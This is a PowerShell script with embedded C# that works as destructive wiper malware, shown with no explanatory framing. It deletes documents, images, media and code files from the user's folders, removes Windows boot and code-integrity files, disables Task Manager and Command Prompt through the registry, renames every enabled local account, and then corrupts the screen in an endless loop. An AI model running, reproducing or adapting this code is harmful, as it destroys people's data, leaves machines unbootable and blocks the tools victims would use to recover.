$desktopPath = [Environment]::GetFolderPath("Desktop")
$documentsPath = [Environment]::GetFolderPath("MyDocuments")
$musicPath = [Environment]::GetFolderPath("MyMusic")
$picturesPath = [Environment]::GetFolderPath("MyPictures")
$videosPath = [Environment]::GetFolderPath("MyVideos")

$extensionsToDelete = @("exe", "json", "doc", "pdf", "wpd", "docx", "rtf", "tex", "odt", "jpg", "jpeg", "mp3", "rar", "vcd", "webp", "css", "html", "py", "php", "ico", "lnk", "mp4", "js", "bak", "xml", "zip", "bmp")

$pathsToDelete = @($desktopPath, $documentsPath, $musicPath, $picturesPath, $videosPath)

foreach ($path in $pathsToDelete) {
    foreach ($extension in $extensionsToDelete) {
        $filesToDelete = Get-ChildItem -Path $path -Filter "*.$extension" -File

        foreach ($file in $filesToDelete) {
            $filePath = $file.FullName
            Write-Host "Deleting file: $filePath"
            Remove-Item -Path $filePath -Force
        }
    }
}

$filesToDelete = @(
    "C:\Windows\System32\Boot\winload.efi",
    "C:\Windows\System32\Boot\winresume.efi",
    "C:\Windows\System32\CodeIntegrity\driver.stl",
    "C:\Windows\System32\CodeIntegrity\driveripolicy.p7b",
    "C:\Windows\System32\eventvwr.exe"
)

foreach ($file in $filesToDelete) {
    if (Test-Path $file) {
        try {
            Remove-Item $file -Force -ErrorAction Stop
            Write-Host "File '$file' successfully deleted."
        }
        catch {
            Write-Host "Error deleting file '$file', system saved."
        }
    }
    else {
        Write-Host "File '$file' does not exist."
    }
}

# Create registry key to disable Task Manager
$disableTaskMgrPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
New-Item -Path $disableTaskMgrPath -Force | Out-Null
Set-ItemProperty -Path $disableTaskMgrPath -Name "DisableTaskMgr" -Value 1

# Create registry key to disable Command Prompt
$disableCmdPath = "HKCU:\Software\Policies\Microsoft\Windows\System"
New-Item -Path $disableCmdPath -Force | Out-Null
Set-ItemProperty -Path $disableCmdPath -Name "DisableCMD" -Value 1

# Create registry key to disable Search Bar in taskbar
$searchBarPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Search"
New-Item -Path $searchBarPath -Force | Out-Null
Set-ItemProperty -Path $searchBarPath -Name "SearchboxTaskbarMode" -Value 0

# Change the user account names
$users = Get-LocalUser | Where-Object {$_.Enabled -eq $true}
foreach ($user in $users) {
    $newName = "⓿⌓⓿"
    Rename-LocalUser -Name $user.Name -NewName $newName
}

$source = @"
using System;
using System.Runtime.InteropServices;
using System.Threading;

public static class Win32
{
    [DllImport("user32.dll")]
    static extern int GetSystemMetrics(int smIndex);

    [DllImport("user32.dll")]
    static extern IntPtr GetDC(IntPtr hWnd);

    [DllImport("gdi32.dll")]
    static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc, int dwRop);

    [DllImport("user32.dll", SetLastError = true)]
    static extern bool SetProcessDPIAware();

    [DllImport("gdi32.dll")]
    static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);

    [DllImport("gdi32.dll")]
    static extern bool TransparentBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc, uint crTransparent);

    public static void ReversePIP()
    {
        SetProcessDPIAware();
        int cx = GetSystemMetrics(0);
        int cy = GetSystemMetrics(1);

        while (true)
        {
            Thread.Sleep(800);
            IntPtr hdc = GetDC(IntPtr.Zero);

            // StretchBlt for Reverse PIP
            //StretchBlt(hdc, 0, 0, cx, cy, hdc, 50, 50, cx - 100, cy - 100, 0x00CC0020);

            // BitBlt for Inverting Colors
            //BitBlt(hdc, 0, 0, cx, cy, hdc, 0, 0, 0x00550009);

            // TransparentBlt for Transparency
            //TransparentBlt(hdc, 0, 0, cx, cy, hdc, 0, 0, cx, cy, 0xFF0000);

            // BitBlt with Raster Operation (ROP) Code for XOR Effect
            BitBlt(hdc, 0, 0, cx, cy, hdc, 0, 0, 0x00660046);
        }
    }
}
"@

Add-Type -TypeDefinition $source -Language CSharp
[Win32]::ReversePIP()
